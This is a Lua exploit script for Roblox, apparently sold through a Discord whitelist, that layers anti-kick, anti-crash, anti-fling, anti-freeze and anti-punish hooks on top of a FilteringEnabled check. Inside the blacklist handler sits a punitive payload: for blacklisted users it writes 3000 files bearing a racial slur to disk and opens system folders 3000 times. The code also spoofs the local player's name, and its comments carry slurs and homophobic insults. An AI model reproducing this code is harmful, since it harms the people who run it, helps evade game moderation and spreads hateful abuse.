game:GetService('Players').LocalPlayer.Name = "FionaWolfgang"
table.foreach(workspace:GetChildren(),function(a,b) if b.Name == "Anti Stuff" then b:Destroy() end end)
wait(1)
local version = "1.3 (6/26/2018)"
--Variables ecks dee
local players = game:GetService("Players")
local user = players.LocalPlayer
local name = user.Name
local a = Instance.new("Message",workspace)
a.Name = "Anti Stuff"
 
--For Blacklisted fucks lol
function idiotnoob()
function stupid()
writefile('blacklist '..math.random(1,2e9)..'.txt', 'hey nigger:['..name..'] Why you blacklisted cunt?')
end
 
local amount = 3000
 
for i=1,amount do
      stupid()
end
 
function lol()
game:OpenScreenshotsFolder()
game:OpenVideosFolder()
end
for i=1,amount do
      lol()
end
end
 
--Whitelist Checker
local BL = {
"ROBLOX", --Lol ur gay
"InceptionTime", -- Ur twice as gay as ROBLOX
"IoIman616", --Creator of IY is meaniebutface head
"404TestAcc404", --My alt but blacklisted for testing
"Fadedfade", -- Lol ur the worst cousin ever, BITCH!
"pretitdor101", -- haha blacklisted
}
BLACKLISTED=false
table.foreach(BL,function(a,b)
    if name == tostring(b) then BLACKLISTED=true
       idiotnoob()
       wait(3)
       table.foreach(workspace:GetChildren(),function(a,b) if b.Name == "Anti Stuff" then b:Destroy() end end)
       user:Kick('Sorry, It appears you are blacklisted! '..name..'  DM <-[Tohru]->#6917 for appeal! {P.S. If youre blacklisted, you probably wont get Unblacklisted but hey, its worth a try lol')
       game.StarterGui:SetCore('SendNotification', {Title='Blacklisted'; Text='Player : '..game:GetService("Players").LocalPlayer.Name..' You are Blacklisted!'})
       end       
end)
local WL = {
"D3F4ULTL00K",
"FionaWolfgang",
"StrictlyMusic",
"garyshaw3",
"IStrictlyExploit",
"L0LIP0PF4IL",
"DangoFreeze",
"infestedmite64",
"ParanoidActions",
"TheAngryShift",
"coolsnape10",
"Zetsubough",
"ShidareSan",
"1337V3rm", -- Dick to me in DMS
"AegisMKIII", --Suprisingly appealed a blacklist Lucky cunt
"A_Void",
"0Lizard",
"XxDarKxDukexX",
"XxLighTxDukexX",
"Rule_x34",
"TheyCallMe_Pat",
"leelandshoe",
"leelandshoe97",
"fernandos10",
"QTN4",
"Q_axe",
}
table.foreach(WL,function(a,b)
    if name == tostring(b) and not BLACKLISTED then WHITELISTED=true end
end)
if WHITELISTED then
    game.StarterGui:SetCore('SendNotification', {Title='Certified Weeb'; Text='Player : '..name..' You are Whitelisted! Your script(s) will execute in [30] total seconds'})
a.Text = "Whitelisted!"
elseif not WHITELISTED and not BLACKLISTED then
    user:Kick('It appears you arent whitelisted! '..name..'! DM  to <-[Tohru]->#6917 buy and whitelist!')
a.Text = "Not Whitelisted, DM <-[Tohru]->#6917 for a $1 Whitelist."
end
--Anti Crash Script
function AntiCrash()
function Part1()
game:GetService("RunService").RenderStepped:connect(function() 
    table.foreach(user.Backpack:GetChildren(),function(a,b) if b.Name == "-" then game.StarterGui:SetCore('SendNotification', {Title='AntiCrash'; Text='Hey '..name..'! Someone tried to crash you!'}) end end)
end)
end
function nou()
    aa=Instance.new("Model",workspace);a.Name=name
    Instance.new("Humanoid",aa)
    b=Instance.new("Part",aa);b.Name="Torso";b.CanCollide=false;b.Transparency=1
    user.Character=aa
end
function aaa()
game:GetService("RunService").RenderStepped:connect(function() 
    table.foreach(user.Backpack:GetChildren(),function(a,b) if b.Name == "-" then nou() end end)
end)
end
game:GetService("RunService").RenderStepped:connect(function() 
    table.foreach(user.Backpack:GetChildren(),function(a,b) if b.Name == "-" then user.Backpack:ClearAllChildren() end end)
end)
Part1()
aaa()
game.StarterGui:SetCore('SendNotification', {Title='AntiCrash'; Text='Hey '..name..'! AntiCrash ran successfully'})
a.Text = "(Might not work) Anti Crash loaded"
end
--Anti Kick Script
function AntiKick()
local AntiKick=false
function respawn()
    aa=Instance.new("Model",workspace);a.Name=name
    Instance.new("Humanoid",aa)
    b=Instance.new("Part",aa);b.Name="Torso";b.CanCollide=false;b.Transparency=1
    user.Character=aa
end
user.CharacterAdded:connect(function(RIP)
    if AntiKick then
        AntiKick=false
        respawn()
    end
    for i,v in pairs(RIP:GetChildren()) do 
        if v:IsA("SkateboardPlatform") then
            game.StarterGui:SetCore('SendNotification', {Title='AntiKick'; Text='Hey '..name..'! Someone attempted to kick you LOL'})
            v:Destroy()
            AntiKick=true
        end
    end
    RIP.ChildAdded:connect(function(haha)
        if haha:IsA("SkateboardPlatform") then wait()
            haha:Destroy()
            game.StarterGui:SetCore('SendNotification', {Title='AntiKick'; Text='Hey '..name..'! Someone attempted to kick you LOL'})
            AntiKick=true
        end
    end)
end)
respawn()
game.StarterGui:SetCore('SendNotification', {Title='AntiKick'; Text='Hey '..name..'! AntiKick ran successfully'})
a.Text = "Anti Kick Loaded"
end
--FE Checker
function FEChecker()
FE = game:GetService("Workspace").FilteringEnabled
if FE == true then
game.StarterGui:SetCore('SendNotification', {Title='FilteringEnabled'; Text='Hey '..name..'! Filtering is enabled! D:'})
a.Text = "Game is FilteringEnabled"
else
game.StarterGui:SetCore('SendNotification', {Title='FilteringEnabled'; Text='Hey '..name..'! Filtering is disabled! :D'})
a.Text = "Game is FilteringDisabled"
end
end
--Anti Fling Script
function AntiFling()
function Part2()
game:GetService("RunService").RenderStepped:connect(function()
table.foreach(user.Character:GetDescendants(),function(a,b) if b:IsA("BodyForce") then game.StarterGui:SetCore('SendNotification', {Title='AntiFling'; Text='Hey '..name..'! Someone attempted to fling you!'}) end end)
    table.foreach(user.Character:GetDescendants(), function(a,b) if b:IsA("BodyForce") then user.Character.Humanoid.Sit = false end end)
end)
end
game:GetService("RunService").RenderStepped:connect(function()
    table.foreach(user.Character:GetDescendants(),function(a,b) if b:IsA("BodyForce") then b:Destroy() end end)
end)
Part2()
game.StarterGui:SetCore('SendNotification', {Title='AntiFling'; Text='Hey '..name..'! AntiFling ran successfully'})
a.Text = "Anti Fling Loaded"
end
--Anti Freeze Script
function AntiFreeze()
function Part3()
game:GetService("RunService").RenderStepped:connect(function()
table.foreach(user.Character:GetDescendants(),function(a,b) if b.Name == "Torso" and b.Anchored then 
game.StarterGui:SetCore('SendNotification', {Title='AntiFreeze'; Text='Hey '..name..'! Someone tried to freeze you!'}) end end)
end)
end
    game:GetService("RunService").RenderStepped:connect(function()
        table.foreach(user.Character:GetDescendants(),function(a,b) if b:IsA("Part") and b.Anchored then b.Anchored = false end end)
    end)
Part3()
game.StarterGui:SetCore('SendNotification', {Title='AntiFreeze'; Text='Hey '..name..'! AntiFreeze ran successfully'})
a.Text = "Anti Freeze Loaded"
end
--Anti Punish Script
function AntiPunish()
game:GetService("RunService").Stepped:connect(function()
    if user.Character then
        if user.Character.Parent~=workspace then
            user.Character.Parent=workspace
            game.StarterGui:SetCore('SendNotification', {Title='AntiPunish'; Text='Hey '..name..'! Someone tried to punish you! (or you died xd)'})
        end
    end
end)
game.StarterGui:SetCore('SendNotification', {Title='AntiPunish'; Text='Hey '..name..'! AntiPunish ran successfully'})
a.Text = "Anti Punish Loaded"
end
--Anti Punish Clone Deleter
function CloneDelete()
game:GetService("RunService").RenderStepped:connect(function()
for i,v in pairs(workspace:GetChildren()) do
    if v.Name==game:GetService("Players").LocalPlayer.Name then
        if game:GetService("Players").LocalPlayer.Character~=v then
            v:Destroy()
            game.StarterGui:SetCore('SendNotification', {Title='CloneDeleter'; Text='Hey '..name..'! Clone Deletion was successful'})
 
        end
    end
end
end)
game.StarterGui:SetCore('SendNotification', {Title='CloneDeleter'; Text='Hey '..name..'! CloneDeleter ran successfully'})
a.Text = "Clone deleter loaded"
end
wait(1)
if WHITELISTED then
print("Changelog (6/21/2018)")
print("-Fixed Script and *most* errors*")
print("-Fixed Whitelist")
print("-Released Script")
print("------------------------------------------------------------------------")
print("Soon to be added")
print("--Anti Kill")
print("--Auto clone deletion (Anti Punish)")
print("--Less lag")
print("--Harder to crack (More and better obfuscation)")
print("------------------------------------------------------------------------")
print("Info")
print("---Discord = [Certified Weeb]#6917, DM for problems/questions")
print("---Script may not always work and/or cause you to crash")
print("The script is reported to lag sometimes but it actually does not, it only appears to lag when running large scripts like OMNI GOD")
print("------------------------------------------------------------------------")
print("Changelog (6/22/2018)")
print("-Added notifiers (missing ones for kick and crash")
print("-Added Auto Clone deletion for antipunish")
print("------------------------------------------------------------------------")
print("Soon to be added")
print("--Anti Kill")
print("--Less lag")
print("--Harder to crack (More and better obfuscation)")
print("--Better Whitelist system")
print("------------------------------------------------------------------------")
print("Changelog (6/23/2018)")
print("-Added notifer for kick (working on crash)")
print("Started development on anti kill and less lag")
print("Added variables to make future updates more easy and convenient")
print("------------------------------------------------------------------------")
print("Soon to be added")
print("--Anti Kill")
print("--Less lag")
print("--Harder to crack (More and better obfuscation)")
print("--Better Whitelist system")
print("--GUI for configuration so you could choose what scripts to run and which to not")
print("------------------------------------------------------------------------")
print("Changelog (6/23/2018)")
print("-Added notifer for kick (working on crash)")
print("-Added a better method of seeing things (load)")
print("-Slowed injecton time... Sorry ;C")
print("------------------------------------------------------------------------")
print("Soon to be added")
print("--Anti Kill")
print("--Less lag")
print("--Harder to crack (More and better obfuscation)")
print("--Better Whitelist system")
print("--GUI for configuration so you could choose what scripts to run and which to not")
print("------------------------------------------------------------------------")
print("Changelog (6/26/2018)")
print("-Added notifer for kick and crash")
print("-Fucked you over if you're blacklisted")
print("-Slowed injecton time... Sorry ;C")
print("-Slightly fixed Anti crash")
wait(4)
print("------------------------------------------------------------------------")
print("Running Anti Crash, This version is bad. Wait at least 5 seconds after a crash")
print("To see if it worked or not, it's really slow and bad and hecc sometimes doesn't even work")
AntiCrash()
wait(4)
print("------------------------------------------------------------------------")
print("Running Antikick, this isn't the best anti kick in the world but it stops commonly used kicks")
print("Such as IY, Rocky2u, TopK3k, you name it. If somehow you still get kicked, dont complain to me about it")
print("It isn't state of the art")
AntiKick()
wait(4)
print("------------------------------------------------------------------------")
print("Running FE Check, lol, nothing to say, it checks FE")
FEChecker()
wait(4)
print("------------------------------------------------------------------------")
print("Running Anti Fling, shitty anti fling i made in like 5 mins, works but not against loop fling oh well")
AntiFling()
wait(4)
print("------------------------------------------------------------------------")
print("Running Anti Freeze, Nothing to say about this, it works i guess lol, btw the notifier bugs a little")
AntiFreeze()
wait(4)
print("------------------------------------------------------------------------")
print("Running Anti Punish, Works, only con is that when you die, you won't despawn lol")
AntiPunish()
wait(4)
print("------------------------------------------------------------------------")
print("Running Clone Deleter, For the anti punish, may cause some lag idk")
CloneDelete()
wait(1)
game.StarterGui:SetCore('SendNotification', {Title='Changelogs'; Text='Click F9 on your keyboard then scroll up to view the changelogs!'})
print("------------------------------------------------------------------------")
print("Hope you enjoy the script! Thanks for buying!")
print('You are running STUFF by <-[Tohru]->#6917 and Tristan#1673. Version: '..version..' ')
wait(2)
table.foreach(workspace:GetChildren(),function(a,b) if b.Name == "Anti Stuff" then b:Destroy() end end)
warn("Script end...")
end
